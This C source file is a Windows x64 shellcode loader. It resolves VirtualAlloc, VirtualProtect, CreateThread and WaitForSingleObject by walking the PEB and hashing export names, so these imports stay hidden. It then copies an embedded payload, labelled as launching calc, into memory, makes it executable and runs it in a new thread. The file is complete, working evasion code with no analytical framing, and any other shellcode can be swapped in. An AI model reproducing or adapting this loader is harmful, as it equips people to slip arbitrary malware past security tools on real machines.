#include <windows.h>
#include <stdint.h>
#include <intrin.h>

// =============================================================
// [1] MANUAL STRUCT DEFINITIONS
// =============================================================
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    void* EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PMY_PEB_LDR_DATA Ldr; 
} MY_PEB, *PMY_PEB;

// =============================================================
// [2] MINI-CRT (Standard Lib Replacements)
// =============================================================
void* malloc(size_t size) {
    return HeapAlloc(GetProcessHeap(), 0, size);
}

void free(void* ptr) {
    if (ptr) HeapFree(GetProcessHeap(), 0, ptr);
}

int tolower(int c) {
    if (c >= 'A' && c <= 'Z') return c + 32;
    return c;
}

int toupper(int c) {
    if (c >= 'a' && c <= 'z') return c - 32;
    return c;
}

int memcmp(const void* ptr1, const void* ptr2, size_t num) {
    const unsigned char* p1 = (const unsigned char*)ptr1;
    const unsigned char* p2 = (const unsigned char*)ptr2;
    for (size_t i = 0; i < num; i++) {
        if (p1[i] != p2[i]) {
            return p1[i] - p2[i];
        }
    }
    return 0;
}

// =============================================================
// [3] TYPEDEFS
// =============================================================
typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);

// =============================================================
// [4] SHELLCODE (x64 Calc)
// =============================================================
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";

// =============================================================
// [5] INJECTED ALGORITHM
// =============================================================
#include <stdint.h> // For uint32_t, uint8_t
#include <stddef.h> // For size_t

uint32_t hash(const unsigned char* data, size_t len) {
    uint32_t seed = 0x20;
    uint32_t seeded_len = ((uint32_t)len ^ seed);

    // Variables for intermediate calculations, always uint32_t to handle 32-bit operations
    uint32_t eax_val;
    uint32_t ecx_val;

    // The Python code's structure dictates that block and tail processing
    // only occur if the input length is greater than 4.
    if (len > 4) {
        // Calculate the number of 4-byte blocks
        uint32_t num_blocks = (uint32_t)len >> 2; // Equivalent to fun_len >> 2 & 0xFFFFFFFF
        size_t new_index = 0; // To store the starting index of the remaining tail bytes

        // Process 4-byte blocks
        for (size_t i = 0; i < num_blocks; ++i) {
            size_t current_data_idx = i * 4;

            // seeded_len = (seeded_len * 0x5BD1E995) & 0xFFFFFFFF
            seeded_len = (seeded_len * 0x5BD1E995);

            // ecx = ((((((data[i+3] << 8) | data[i+2]) << 8) | data[i+1]) << 8 | data[i]) * 0x5BD1E995) & 0xFFFFFFFF
            // This constructs a 32-bit integer from 4 bytes in little-endian order.
            uint32_t k_val = (uint32_t)data[current_data_idx] |
                             ((uint32_t)data[current_data_idx + 1] << 8) |
                             ((uint32_t)data[current_data_idx + 2] << 16) |
                             ((uint32_t)data[current_data_idx + 3] << 24);

            ecx_val = (k_val * 0x5BD1E995);

            // eax = ecx
            // eax = eax >> 0x18 & 0xFFFFFFFF
            // eax = (eax ^ ecx) & 0xFFFFFFFF
            eax_val = ecx_val;
            eax_val = eax_val >> 0x18;
            eax_val = (eax_val ^ ecx_val);

            // ecx = (eax * 0x5BD1E995) & 0xFFFFFFFF
            ecx_val = (eax_val * 0x5BD1E995);

            // seeded_len = (seeded_len ^ ecx) & 0xFFFFFFFF
            seeded_len = (seeded_len ^ ecx_val);

            new_index = current_data_idx + 4; // Update new_index for the start of the tail
        }

        // Tail processing for remaining bytes (len % 4)
        // Python's `fun_len` after block processing is `len - (4 * (len >> 2))`, which is `len % 4`.
        uint32_t remaining_len = (uint32_t)len % 4;
        const unsigned char* tail_ptr = data + new_index;

        if (remaining_len == 1) {
            // if (fun_len - 1) == 0:
            eax_val = ((uint32_t)tail_ptr[0] ^ seeded_len);
            seeded_len = (eax_val * 0x5BD1E995);
            return eax_val; // This is an unusual early return specific to the Python code
        } else if (remaining_len == 2) {
            // elif (fun_len - 2) == 0:
            eax_val = ((uint32_t)tail_ptr[1] << 8);
            seeded_len = seeded_len ^ eax_val;
            eax_val = (uint32_t)tail_ptr[0];
            eax_val = eax_val ^ seeded_len;
            seeded_len = (eax_val * 0x5BD1E995);
        } else if (remaining_len == 0) {
            // elif (fun_len - 3) != 0: (which means fun_len is not 3, and not 1 or 2, so it must be 0)
            // pass (do nothing)
        } else { // remaining_len == 3
            // else:
            eax_val = (uint32_t)tail_ptr[2];
            eax_val = eax_val << 0x10;
            seeded_len = (seeded_len ^ eax_val);
            eax_val = (uint32_t)tail_ptr[1];
            eax_val = (eax_val << 8);
            seeded_len = (seeded_len ^ eax_val);
            eax_val = (uint32_t)tail_ptr[0];
            eax_val = eax_val ^ seeded_len;
            seeded_len = (eax_val * 0x5BD1E995);
        }
    } // End of `if (len > 4)` block

    // Finalization steps (executed after block/tail processing, or directly if len <= 4)
    eax_val = seeded_len;
    eax_val = eax_val >> 0xD;
    eax_val = eax_val ^ seeded_len;
    ecx_val = (eax_val * 0x5BD1E995);
    eax_val = ecx_val;
    eax_val = (eax_val >> 0xF);
    eax_val = eax_val ^ ecx_val;

    return eax_val;
}

// =============================================================
// [6] RESOLVER LOGIC
// =============================================================
void* ResolveApi(uint32_t targetHash) {
    #ifndef _WIN64
        return NULL; 
    #endif

    MY_PEB* peb = (MY_PEB*)__readgsqword(0x60);
    MY_PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        MY_LDR_DATA_TABLE_ENTRY* entry = (MY_LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(curr, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        if (entry->DllBase) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)entry->DllBase;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)entry->DllBase + dos->e_lfanew);
                
                if (nt->Signature == IMAGE_NT_SIGNATURE && 
                    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
                    
                    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)entry->DllBase + 
                        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                    
                    DWORD* names = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfNames);
                    WORD* ordinals = (WORD*)((BYTE*)entry->DllBase + exp->AddressOfNameOrdinals);
                    DWORD* funcs = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfFunctions);

                    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                        char* name = (char*)((BYTE*)entry->DllBase + names[i]);
                        
                        size_t len = 0;
                        while(name[len]) len++;

                        uint32_t currentHash = hash((unsigned char*)name, len);
                        
                        if (currentHash == targetHash) {
                            return (void*)((BYTE*)entry->DllBase + funcs[ordinals[i]]);
                        }
                    }
                }
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

// =============================================================
// [7] CUSTOM ENTRY POINT
// =============================================================
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = 0xDFECF2B8;
    uint32_t h_VirtualProtect = 0x5FC12657;
    uint32_t h_CreateThread = 0xB4940BB;
    uint32_t h_WaitForSingleObject = 0x6177DD99;
    
    // Resolve
    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(h_VirtualAlloc);
    if (!pVirtualAlloc) ExitProcess(1);

    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(h_VirtualProtect);
    if (!pVirtualProtect) ExitProcess(2);

    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);
    if (!pCreateThread) ExitProcess(3);

    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(h_WaitForSingleObject);
    if (!pWaitForSingleObject) ExitProcess(4);

    // Allocate
    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) ExitProcess(5);

    // Copy
    unsigned char* src = buf;
    unsigned char* dst = (unsigned char*)exec_mem;
    for (int i = 0; i < sizeof(buf); i++) {
        dst[i] = src[i];
    }

    // Protect
    DWORD oldProtect;
    if (!pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldProtect)) {
         ExitProcess(6);
    }

    // Thread
    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!hThread) ExitProcess(7);

    // Wait
    pWaitForSingleObject(hThread, 0xFFFFFFFF);
    
    ExitProcess(0);
}